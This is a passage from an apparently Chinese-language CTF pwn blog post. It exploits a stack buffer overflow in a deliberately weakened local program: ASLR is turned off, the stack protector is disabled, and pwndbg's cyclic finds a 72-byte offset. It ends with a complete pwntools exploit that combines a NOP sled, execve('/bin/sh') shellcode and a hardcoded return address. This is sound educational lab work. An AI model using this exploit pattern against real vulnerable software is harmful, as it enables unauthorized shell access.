class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实战操作："><a href="#实战操作：" class="headerlink" title="实战操作："></a>实战操作：</h1><p>我们首先是看代码：<br>首先是 vuln 函数，有一个 buf[64]，还有一个危险函数 <strong>read</strong>，可以发现 read 可以读取 256 到 64 字节。所以我们可以使用缓冲区溢出漏洞来进行渗透。<br>首先先编一下这个 <strong>vuln.c</strong>，然后为了我们后面的缓冲区溢出可以正常操作，我们还需要先关闭ASLR</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 | <span class="built_in">sudo</span> <span class="built_in">tee</span> /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o shell_code shell_code.c -no-pie -fno-stack-protector -z execstack -Wno-stringop-overflow</span><br></pre></td></tr></table></figure><p>我们可以看看这个代码的运行效果：<br><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/20260123171353541.png?imageSlim" alt="image.png"></p><p>我们可以先用很大的一个数据把它的<strong>data</strong>填满，然后再返回地址中填写我们的<strong>shellcode</strong>。</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>现在进行<strong>pwndbg</strong>的调试吧,直接使用<strong>start</strong><br><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/20260123171334856.png?imageSlim" alt="image.png"></p><p>然后我们在<strong>pwndbg</strong>里生成模式串<br>我们这里直接使用<code>pwndbg</code>自带的<code>cyclic</code>来生成一堆冗杂数据来填满我们的<code>data</code>使其程序崩溃<br><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/20260123171401566.png?imageSlim" alt="image.png"></p><p>从调试中可以看到这些信息：<br>我们发现这里的RSP没有正常的显示他的地址，不着急，可以先算算buf到RBP的距离，然后再加上旧的RBP一样可以算出来我们的偏移量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6161616161616169</span><br><span class="line">Finding cyclic pattern of 8 bytes: b&#x27;iaaaaaaa&#x27; (hex: 0x6961616161616161)</span><br><span class="line">Found at offset 64</span><br></pre></td></tr></table></figure><p>算出来了RBP的之后，我们就可以知道RSP的了。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[buf（64字节）][旧的RBP（8字节）][返回地址（8字节）]</span><br></pre></td></tr></table></figure><p><strong>正确的偏移量：</strong></p><ul><li><strong>到RBP的偏移：64字节</strong></li><li><strong>到RIP的偏移：72字节</strong></li></ul><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>我们也可以使用这种方法：<br><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/20260123171410231.png?imageSlim" alt="image.png"></p><p>我们也是可以计算出偏移量的。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>算完之后，我们现在就可以来构造一个exp来进行攻击了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 禁用 ASLR 运行程序</span></span><br><span class="line">    p = process([<span class="string">&#x27;setarch&#x27;</span>, <span class="string">&#x27;x86_64&#x27;</span>, <span class="string">&#x27;-R&#x27;</span>, <span class="string">&#x27;./shellcode&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待输入提示</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Input your data: &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用更小的 shellcode (execve(&quot;/bin/sh&quot;, NULL, NULL))</span></span><br><span class="line">    shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 偏移量</span></span><br><span class="line">    offset = <span class="number">72</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用一个常见的栈地址 (在禁用 ASLR 时应该有效)</span></span><br><span class="line">    return_addr = <span class="number">0x7fffffffe100</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造 payload</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * offset                    <span class="comment"># 填充到返回地址</span></span><br><span class="line">    payload += p64(return_addr)               <span class="comment"># 覆盖返回地址</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">50</span>                   <span class="comment"># NOP sled</span></span><br><span class="line">    payload += shellcode                      <span class="comment"># shellcode</span></span><br><span class="line">    </span><br><span class="line">    log.info(<span class="string">f&quot;Sending payload of <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Offset: <span class="subst">&#123;offset&#125;</span>&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Shellcode length: <span class="subst">&#123;<span class="built_in">len</span>(shellcode)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    log.info(<span class="string">f&quot;Return address: <span class="subst">&#123;<span class="built_in">hex</span>(return_addr)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送 payload</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试获取 shell</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        log.error(<span class="string">&quot;Exploit failed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后试试效果：<br><img src="https://animebucket-1313463726.cos.ap-guangzhou.myqcloud.com/blogs_pic/20260123171418380.png?imageSlim" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
